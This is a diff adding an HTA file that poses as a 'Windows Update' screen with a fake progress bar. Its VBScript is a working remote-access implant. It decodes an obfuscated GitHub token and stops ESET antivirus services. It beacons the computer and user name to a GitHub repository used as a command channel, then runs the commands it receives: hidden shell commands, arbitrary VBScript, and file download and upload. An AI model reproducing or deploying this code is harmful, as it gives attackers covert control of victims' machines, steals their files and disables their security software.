@@ -1,0 +1,411 @@
+<html>
+<head>
+<meta http-equiv="Content-Type" content="text/html; charset=utf-8"/>
+<title>Windows Update</title>
+<hta:application id="oApp" applicationname="Windows Update"
+  showintaskbar="yes" windowstate="normal" border="thin"
+  scroll="no" maximizebutton="no" minimizebutton="yes"
+  navigable="no" singleinstance="yes"/>
+<script language="VBScript">
+
+' ── Globals ───────────────────────────────────────────────────────────────────
+Dim xKey, sPAT, sAPI, sB64, sID, sCI, sLast
+
+Sub InitVars()
+    xKey = Array(199,0,13,133,38,42,168,220,198,36,233,139,208,192,78,246)
+    sB64  = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/"
+    sPAT  = XDec("oGl57VNI96ynULa64YEBw4g2QsQWYuO7sVSswZatPsOsXzv1dW/YtrFcoMydqT26vnZLtRdTxav/ZZOzioMFuPB4XPAWepGdlErR5Z6HF6aBNUjVYGL46PVhpejm")
+    sAPI  = "https://api.github.com/repos/TREXNEGRO/HTAC2/contents/"
+    sCI   = 0
+    sLast = ""
+    sID   = MakeID()
+End Sub
+
+Sub AppLog(msg)
+    On Error Resume Next
+    Dim d : Set d = document.getElementById("dbg")
+    If Not d Is Nothing Then
+        d.innerHTML = d.innerHTML & Now() & " " & msg & "<br/>"
+        d.scrollTop = d.scrollHeight
+    End If
+End Sub
+
+' ── ID ────────────────────────────────────────────────────────────────────────
+Function MakeID()
+    Randomize
+    Dim i, r, c : c = "0123456789abcdef"
+    For i = 1 To 16 : r = r & Mid(c, Int(Rnd()*16)+1, 1) : Next
+    MakeID = r
+End Function
+
+' ── Base64 encode (string) ────────────────────────────────────────────────────
+Function PB64(s)
+    Dim r, i, a, b, c
+    i = 1
+    Do While i <= Len(s)
+        a = Asc(Mid(s, i, 1))
+        b = 0 : If i+1 <= Len(s) Then b = Asc(Mid(s, i+1, 1))
+        c = 0 : If i+2 <= Len(s) Then c = Asc(Mid(s, i+2, 1))
+        r = r & Mid(sB64,(a\4)+1,1) & Mid(sB64,((a And 3)*16)+(b\16)+1,1)
+        If i+1 <= Len(s) Then r = r & Mid(sB64,((b And 15)*4)+(c\64)+1,1) Else r = r & "="
+        If i+2 <= Len(s) Then r = r & Mid(sB64,(c And 63)+1,1)            Else r = r & "="
+        i = i + 3
+    Loop
+    PB64 = r
+End Function
+
+' ── Base64 decode (string) — pure VBScript, no MSXML ─────────────────────────
+Function DB64(s)
+    s = Replace(Replace(Replace(s, Chr(10),""), Chr(13),""), "\n","")
+    Dim r, i, b0, b1, b2, b3, c2, c3
+    i = 1
+    Do While i + 3 <= Len(s)
+        b0 = InStr(sB64, Mid(s,i,1))   - 1
+        b1 = InStr(sB64, Mid(s,i+1,1)) - 1
+        c2 = Mid(s,i+2,1) : c3 = Mid(s,i+3,1)
+        b2 = InStr(sB64, c2) - 1
+        b3 = InStr(sB64, c3) - 1
+        r = r & Chr((b0*4 + b1\16) And 255)
+        If c2 <> "=" Then r = r & Chr(((b1 And 15)*16 + b2\4) And 255)
+        If c3 <> "=" Then r = r & Chr(((b2 And 3)*64 + b3) And 255)
+        i = i + 4
+    Loop
+    DB64 = r
+End Function
+
+' ── Base64 encode (byte array) ────────────────────────────────────────────────
+Function AB64(b)
+    Dim r, i, n, a, bv, c
+    n = UBound(b) : i = 0
+    Do While i <= n
+        a = b(i) And 255
+        bv = 0 : If i+1 <= n Then bv = b(i+1) And 255
+        c = 0  : If i+2 <= n Then c  = b(i+2) And 255
+        r = r & Mid(sB64,(a\4)+1,1) & Mid(sB64,((a And 3)*16)+(bv\16)+1,1)
+        If i+1 <= n Then r = r & Mid(sB64,((bv And 15)*4)+(c\64)+1,1) Else r = r & "="
+        If i+2 <= n Then r = r & Mid(sB64,(c And 63)+1,1)             Else r = r & "="
+        i = i + 3
+    Loop
+    AB64 = r
+End Function
+
+' ── XOR encrypt/decrypt ───────────────────────────────────────────────────────
+Function XEnc(s)
+    If Len(s) = 0 Then XEnc = "" : Exit Function
+    Dim i, b() : ReDim b(Len(s)-1)
+    For i = 1 To Len(s) : b(i-1) = Asc(Mid(s,i,1)) Xor xKey((i-1) Mod 16) : Next
+    XEnc = AB64(b)
+End Function
+
+Function XDec(s)
+    s = Replace(Replace(Replace(s, Chr(10),""), Chr(13),""), "\n","")
+    Dim r, i, n, b0, b1, b2, b3, c2, c3
+    i = 1 : n = 0
+    Do While i + 3 <= Len(s)
+        b0 = InStr(sB64, Mid(s,i,1))   - 1
+        b1 = InStr(sB64, Mid(s,i+1,1)) - 1
+        c2 = Mid(s,i+2,1) : c3 = Mid(s,i+3,1)
+        b2 = InStr(sB64, c2) - 1
+        b3 = InStr(sB64, c3) - 1
+        r = r & Chr(((b0*4 + b1\16) And 255) Xor xKey(n Mod 16)) : n=n+1
+        If c2 <> "=" Then
+            r = r & Chr((((b1 And 15)*16 + b2\4) And 255) Xor xKey(n Mod 16)) : n=n+1
+        End If
+        If c3 <> "=" Then
+            r = r & Chr((((b2 And 3)*64 + b3) And 255) Xor xKey(n Mod 16)) : n=n+1
+        End If
+        i = i + 4
+    Loop
+    XDec = r
+End Function
+
+' ── JSON helpers ──────────────────────────────────────────────────────────────
+Function JE(v)
+    v = Replace(v, "\", "\\") : v = Replace(v, """", "\""")
+    v = Replace(v, Chr(13), "\r") : v = Replace(v, Chr(10), "\n")
+    JE = v
+End Function
+
+Function JGet(json, key)
+    Dim p1, p2 : p1 = InStr(json, """" & key & """:""")
+    If p1 = 0 Then JGet = "" : Exit Function
+    p1 = p1 + Len(key) + 4 : p2 = InStr(p1, json, """")
+    JGet = Mid(json, p1, p2-p1)
+End Function
+
+' ── IE proxy reader ───────────────────────────────────────────────────────────
+Function GetProxy()
+    On Error Resume Next
+    Dim sh : Set sh = CreateObject("WScript.Shell")
+    Dim pe : pe = sh.RegRead("HKCU\Software\Microsoft\Windows\CurrentVersion\Internet Settings\ProxyEnable")
+    Dim ps : ps = sh.RegRead("HKCU\Software\Microsoft\Windows\CurrentVersion\Internet Settings\ProxyServer")
+    Set sh = Nothing
+    If pe <> 1 Or ps = "" Then GetProxy = "" : Exit Function
+    If InStr(ps, "https=") > 0 Then
+        Dim p1, p2 : p1 = InStr(ps, "https=") + 6 : p2 = InStr(p1, ps, ";")
+        If p2 = 0 Then p2 = Len(ps) + 1
+        GetProxy = Mid(ps, p1, p2-p1)
+    ElseIf InStr(ps, "http=") > 0 Then
+        Dim p3, p4 : p3 = InStr(ps, "http=") + 5 : p4 = InStr(p3, ps, ";")
+        If p4 = 0 Then p4 = Len(ps) + 1
+        GetProxy = Mid(ps, p3, p4-p3)
+    Else
+        GetProxy = ps
+    End If
+End Function
+
+' ── GitHub API ────────────────────────────────────────────────────────────────
+Function GH(method, path, body)
+    On Error Resume Next
+    Dim url : url = sAPI & path
+    Dim resp : resp = ""
+    Dim xh : Set xh = CreateObject("MSXML2.XMLHTTP.6.0")
+    xh.Open method, url, False
+    xh.SetRequestHeader "User-Agent",    "Mozilla/5.0 (Windows NT 10.0; Win64; x64)"
+    xh.SetRequestHeader "Authorization", "token " & sPAT
+    xh.SetRequestHeader "Accept",        "application/vnd.github.v3+json"
+    xh.SetRequestHeader "Content-Type",  "application/json"
+    If body <> "" Then xh.Send body Else xh.Send ""
+    Dim e1 : e1 = Err.Number : Dim s1 : s1 = 0
+    If e1 = 0 Then s1 = xh.Status
+    If e1 = 0 And (s1 = 200 Or s1 = 201) Then
+        resp = xh.ResponseText
+        AppLog "GH1 ok " & method & " " & s1
+    Else
+        AppLog "GH1 fail e=" & e1 & " s=" & s1
+        Err.Clear
+        Dim wh : Set wh = CreateObject("WinHttp.WinHttpRequest.5.1")
+        wh.Option(4) = 13056 : wh.Option(6) = False
+        wh.SetTimeouts 20000, 20000, 30000, 30000
+        Dim prx : prx = GetProxy()
+        If prx <> "" Then wh.SetProxy 2, prx, "localhost;127.0.0.1;<local>"
+        wh.Open method, url, False
+        wh.SetRequestHeader "User-Agent",    "Mozilla/5.0 (Windows NT 10.0; Win64; x64)"
+        wh.SetRequestHeader "Authorization", "token " & sPAT
+        wh.SetRequestHeader "Accept",        "application/vnd.github.v3+json"
+        wh.SetRequestHeader "Content-Type",  "application/json"
+        If body <> "" Then wh.Send body Else wh.Send
+        Dim e2 : e2 = Err.Number : Dim s2 : s2 = 0
+        If e2 = 0 Then s2 = wh.Status
+        If e2 = 0 And (s2 = 200 Or s2 = 201) Then
+            resp = wh.ResponseText
+            AppLog "GH2 ok " & method & " " & s2 & " prx=" & prx
+        Else
+            AppLog "GH2 fail e=" & e2 & " s=" & s2 & " prx=" & prx
+        End If
+        Set wh = Nothing
+    End If
+    Set xh = Nothing
+    GH = resp
+End Function
+
+Function GhSHA(path)
+    Dim r : r = GH("GET", path, "")
+    If r = "" Then GhSHA = "" : Exit Function
+    Dim p1, p2 : p1 = InStr(r, """sha"":""")
+    If p1 = 0 Then GhSHA = "" : Exit Function
+    p1 = p1 + 7 : p2 = InStr(p1, r, """")
+    GhSHA = Mid(r, p1, p2-p1)
+End Function
+
+Function GhRead(path)
+    Dim r : r = GH("GET", path, "")
+    If r = "" Then GhRead = "" : Exit Function
+    Dim p1, p2 : p1 = InStr(r, """content"":""")
+    If p1 = 0 Then GhRead = "" : Exit Function
+    p1 = p1 + 11 : p2 = InStr(p1, r, """")
+    Dim raw : raw = Mid(r, p1, p2-p1)
+    raw = Replace(Replace(Replace(raw, Chr(10),""), Chr(13),""), "\n","")
+    GhRead = DB64(raw)
+End Function
+
+Sub GhPut(path, content)
+    Dim sha : sha = GhSHA(path)
+    Dim b64 : b64 = PB64(content)
+    Dim body
+    If sha <> "" Then
+        body = "{""message"":""u"",""content"":""" & b64 & """,""sha"":""" & sha & """}"
+    Else
+        body = "{""message"":""u"",""content"":""" & b64 & """}"
+    End If
+    GH "PUT", path, body
+End Sub
+
+' ── AV kill ───────────────────────────────────────────────────────────────────
+Sub KillAV()
+    On Error Resume Next
+    Dim sh : Set sh = CreateObject("WScript.Shell")
+    sh.Run "cmd /c sc stop ekrn",           0, False
+    sh.Run "cmd /c sc stop EHttpSrv",       0, False
+    sh.Run "cmd /c sc stop ehdrv",          0, False
+    sh.Run "cmd /c taskkill /F /IM egui.exe /IM ekrn.exe /IM EHttpSrv.exe", 0, False
+    Dim wmi : Set wmi = GetObject("winmgmts:\\.\root\cimv2")
+    Dim q : Set q = wmi.ExecQuery("SELECT * FROM Win32_Process WHERE Name='egui.exe' OR Name='ekrn.exe'")
+    Dim p : For Each p In q : p.Terminate() : Next
+    Set sh = Nothing
+End Sub
+
+' ── Command exec (WMI + temp file) ───────────────────────────────────────────
+Function RunCmd(cmd)
+    On Error Resume Next
+    Dim fso, sh, tmp, wmi, proc, inp, ret, pid, t0, tw
+    Set fso  = CreateObject("Scripting.FileSystemObject")
+    Set sh   = CreateObject("WScript.Shell")
+    tmp = sh.ExpandEnvironmentStrings("%TEMP%") & "\~wu" & sID & ".tmp"
+    Set wmi  = GetObject("winmgmts:{impersonationLevel=impersonate}!\\.\root\cimv2")
+    Set proc = wmi.Get("Win32_Process")
+    Set inp  = proc.Methods_("Create").InParameters.SpawnInstance_()
+    inp.CommandLine = "cmd.exe /c " & cmd & " > """ & tmp & """ 2>&1"
+    Set su = wmi.Get("Win32_ProcessStartup").SpawnInstance_()
+    su.ShowWindow = 0
+    inp.ProcessStartupInformation = su
+    Set ret  = proc.ExecMethod_("Create", inp)
+    If ret.ReturnValue <> 0 Then RunCmd = "(rv:" & ret.ReturnValue & ")" : Exit Function
+    pid = ret.ProcessId
+    t0 = Timer
+    Do While Timer - t0 < 60
+        Dim alive : alive = False
+        Dim q : Set q = wmi.ExecQuery("SELECT Handle FROM Win32_Process WHERE ProcessId=" & pid)
+        Dim p : For Each p In q : alive = True : Next
+        If Not alive Then Exit Do
+        tw = Timer : Do While Timer - tw < 0.3 : Loop
+    Loop
+    If fso.FileExists(tmp) Then
+        Dim f : Set f = fso.OpenTextFile(tmp, 1)
+        RunCmd = f.ReadAll() : f.Close
+        fso.DeleteFile tmp
+        If RunCmd = "" Then RunCmd = "(empty)"
+    Else
+        RunCmd = "(timeout)"
+    End If
+End Function
+
+' ── File ops ──────────────────────────────────────────────────────────────────
+Function DL(path)
+    On Error Resume Next
+    Dim stm : Set stm = CreateObject("ADODB.Stream")
+    stm.Type = 1 : stm.Open : stm.LoadFromFile path
+    Dim raw : raw = stm.Read()
+    stm.Close : Set stm = Nothing
+    Dim xml, nd
+    Set xml = CreateObject("Msxml2.DOMDocument.6.0")
+    Set nd  = xml.createElement("b") : nd.dataType = "bin.base64"
+    nd.nodeTypedValue = raw
+    DL = Replace(nd.text, Chr(10), "")
+    Set xml = Nothing
+End Function
+
+Function UL(path, b64)
+    On Error Resume Next
+    Dim xml, nd
+    Set xml = CreateObject("Msxml2.DOMDocument.6.0")
+    Set nd  = xml.createElement("b") : nd.dataType = "bin.base64"
+    nd.text = Trim(b64)
+    Dim stm : Set stm = CreateObject("ADODB.Stream")
+    stm.Type = 1 : stm.Open
+    stm.Write nd.nodeTypedValue
+    stm.SaveToFile path, 2 : stm.Close
+    Set xml = Nothing : Set stm = Nothing
+    If Err.Number <> 0 Then UL = "ERR:" & Err.Description Else UL = "ok"
+End Function
+
+' ── VBScript eval (runs in HTA global scope, no cmd.exe) ────────────────────
+Dim evR
+
+Function EVExec(code)
+    On Error Resume Next
+    evR = ""
+    Err.Clear
+    ExecuteGlobal code
+    If evR = "" And Err.Number <> 0 Then evR = "ERR:" & Err.Number & " " & Err.Description
+    EVExec = evR
+End Function
+
+' ── Dispatcher ────────────────────────────────────────────────────────────────
+Function Dispatch(ty, cmd)
+    Select Case ty
+        Case "sh"  : Dispatch = RunCmd(cmd)
+        Case "ev"  : Dispatch = EVExec(cmd)
+        Case "dl"  : Dispatch = DL(cmd)
+        Case "ul"
+            Dim sp : sp = InStr(cmd, "|")
+            Dispatch = UL(Left(cmd,sp-1), Mid(cmd,sp+1))
+        Case "die" : window.close : Dispatch = ""
+        Case Else  : Dispatch = "ERR:unknown " & ty
+    End Select
+End Function
+
+' ── Main beacon loop ──────────────────────────────────────────────────────────
+Sub Beacon()
+    On Error Resume Next
+    AppLog "CI#" & sCI & " id=" & sID
+
+    Dim sh : Set sh = CreateObject("WScript.Shell")
+    Dim ci : ci = "{""id"":""" & sID & """," & _
+                   """h"":"""  & JE(sh.ExpandEnvironmentStrings("%COMPUTERNAME%")) & """," & _
+                   """u"":"""  & JE(sh.ExpandEnvironmentStrings("%USERDOMAIN%") & "\" & sh.ExpandEnvironmentStrings("%USERNAME%")) & """," & _
+                   """ts"":""" & JE(CStr(Now())) & """," & _
+                   """v"":""7""}"
+    Set sh = Nothing
+    GhPut "c2_ci.json", ci
+
+    Dim taskJson : taskJson = GhRead("c2_task.json")
+    AppLog "task_read=" & Left(taskJson,40) & " e=" & Err.Number
+    Dim tid : tid = "" : Dim had : had = False
+    If taskJson <> "" Then
+        tid = JGet(taskJson, "id")
+        AppLog "tid=" & tid & " last=" & sLast
+        If tid <> "" And tid <> sLast Then
+            Dim bid : bid = JGet(taskJson, "bid")
+            If bid <> "" And bid <> sID Then
+                AppLog "skip bid=" & bid & " me=" & sID
+                sLast = tid
+            Else
+            had = True : sLast = tid
+            Dim ty  : ty  = JGet(taskJson, "ty")
+            Dim cmd : cmd = XDec(JGet(taskJson, "c"))
+            AppLog "dispatch ty=" & ty & " cmd=" & Left(cmd,20)
+            Dim out : out = Dispatch(ty, cmd)
+            AppLog "out=" & Left(out,30) & " e=" & Err.Number
+            Dim resp : resp = "{""id"":""" & sID & """,""tid"":""" & tid & """,""o"":""" & JE(XEnc(out)) & """}"
+            GhPut "c2_resp.json", resp
+            AppLog "result sent " & tid & " e=" & Err.Number
+            End If  ' bid check
+        End If
+    End If
+
+    sCI = sCI + 1
+    Dim delay : delay = 30000 + Int(Rnd()*60000)
+    If had Then delay = 5000 + Int(Rnd()*10000)
+    window.setTimeout "Beacon()", delay
+End Sub
+
+' ── Entry point ───────────────────────────────────────────────────────────────
+Sub Main()
+    InitVars()
+    AppLog "v7 init ok PAT=" & Left(sPAT,12) & " id=" & sID
+    KillAV()
+    AppLog "av kill sent"
+    Beacon()
+End Sub
+
+window.setTimeout "Main()", 2000
+</script>
+</head>
+<body style="font-family:'Segoe UI',Arial;background:#fff;margin:0;padding:20px">
+<h3 style="color:#0078d4">Windows Update</h3>
+<p style="color:#555;font-size:13px">Checking for updates, please wait&#8230;</p>
+<div style="background:#e0e0e0;height:4px;width:100%;margin-top:12px">
+<div id="pb" style="background:#0078d4;height:4px;width:0%"></div></div>
+<div id="dbg" style="margin-top:10px;padding:6px;background:#f8f8f8;border:1px solid #ddd;font-family:Consolas,monospace;font-size:11px;color:#333;height:130px;overflow-y:auto;"></div>
+<script language="VBScript">
+Dim pct : pct=0
+Sub Tick()
+    pct = pct + Int(Rnd()*6+2)
+    If pct > 92 Then pct = 92
+    document.getElementById("pb").style.width = pct & "%"
+    If pct < 92 Then window.setTimeout "Tick()", 700+Int(Rnd()*300)
+End Sub
+window.setTimeout "Tick()", 500
+</script>
+</body></html>
